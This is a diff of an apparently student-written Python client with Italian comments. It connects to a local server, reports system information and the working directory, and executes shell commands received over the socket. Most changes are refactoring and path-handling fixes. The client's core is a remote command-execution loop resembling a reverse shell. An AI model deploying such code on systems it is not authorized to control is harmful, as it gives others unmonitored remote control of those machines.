@@ -3,10 +3,12 @@ from datetime import datetime
 import os, platform, subprocess, re, time
 import psutil #verificare funzionamento su linux e mac
 
+BUFFER_SIZE = 1024 * 4
 serverName = 'localhost'
 serverPort = 12000
 clientSocket = socket(AF_INET, SOCK_STREAM)
 def connessione():
+    global cwd
     connesso = False
     tempo_attesa = 5
     
@@ -21,7 +23,9 @@ def connessione():
             time.sleep(tempo_attesa)
             tempo_attesa*=2
         else:
-            connesso = True
+            connesso = True 
+            cwd = os.getcwd()
+            invia_messaggio(cwd)
             
 def invia_messaggio(messaggio):
     global clientSocket
@@ -30,7 +34,7 @@ def invia_messaggio(messaggio):
             clientSocket.send(messaggio.encode())
             break
         except Exception as e:
-            #Il server si è disconnesso nel mentre, tentiamo la riconnessione e rimandiamo il messaggio
+            #Il server si e' disconnesso nel mentre, tentiamo la riconnessione e rimandiamo il messaggio
             print (str(e.errno))
             print(str(e))
             clientSocket.close()
@@ -41,10 +45,10 @@ def ricevi_messaggio():
     global clientSocket
     while True:
         try:
-            messaggio = clientSocket.recv(4096).decode()
+            messaggio = clientSocket.recv(BUFFER_SIZE).decode()
             return messaggio
         except Exception as e:
-            #Il server si è disconnesso nel mentre, tentiamo la riconnessione e la ricezione del messaggio
+            #Il server si e' disconnesso nel mentre, tentiamo la riconnessione e la ricezione del messaggio
             print (str(e.errno))
             print(str(e))
             clientSocket.close()
@@ -107,15 +111,16 @@ def getInfoBootTime():
     ore = boot_time.hour
     minuti = boot_time.minute
     secondi = boot_time.second
-    sentence = f"Il sistema è attivo dal giorno {giorno}/{mese}/{anno} dalle ore {ore}:{minuti}:{secondi}"
+    sentence = f"Il sistema e\' attivo dal giorno {giorno}/{mese}/{anno} dalle ore {ore}:{minuti}:{secondi}"
     return intestazione+sentence
 
 def executeShellCommand(cmd):
     #Prendiamo ogni componente del comando per distinguere tra cd e altri comandi
+    global cwd
     split_cmd = cmd.split()
     if split_cmd[0] == "cd":
         #Tentativo per cambiamento directory assoluta
-        if split_cmd[1].split('/')[0] == '.':
+        if split_cmd[1].find('\\') == 0:
             try:
                 os.chdir(''.join(split_cmd[1]))
             except FileNotFoundError as e:
@@ -126,12 +131,12 @@ def executeShellCommand(cmd):
         else: 
         #Tentativo per cambiamento directory relativa
             try:
-                os.chdir(cwd+'/'.join(split_cmd[1]))
+                os.chdir(cwd+'\\'+''.join(split_cmd[1]))
             except FileNotFoundError as e:
-                    #se c'e un errore lo restituiamo in output
-                    output = str(e)
+                #se c'e un errore lo restituiamo in output
+                output = str(e)
             else:
-                    output = ''
+                output = ''
     else: 
         output = subprocess.getoutput(cmd)
     cwd = os.getcwd()
@@ -165,13 +170,9 @@ def converti_byte(byte):
 connessione()
 while True:
     #Ricaviamo la current working directory dell host su cui gira il client
-    cwd = os.getcwd()
-    invia_messaggio(cwd+'\n'+getInfoSO()+'\n'+getInfoCPU()+'\n'+getInfoBootTime()+'\n'+f'cwd={cwd}')
     #Inviamo una seconda volta la cwd per motivi di interfaccia lato server
-    invia_messaggio(cwd)
     comando = ricevi_messaggio()
-    print ("Ho ricevuto " + comando)
-
+    
     if comando == "1":
         invia_messaggio(getInfoSO())
     elif comando == "2":
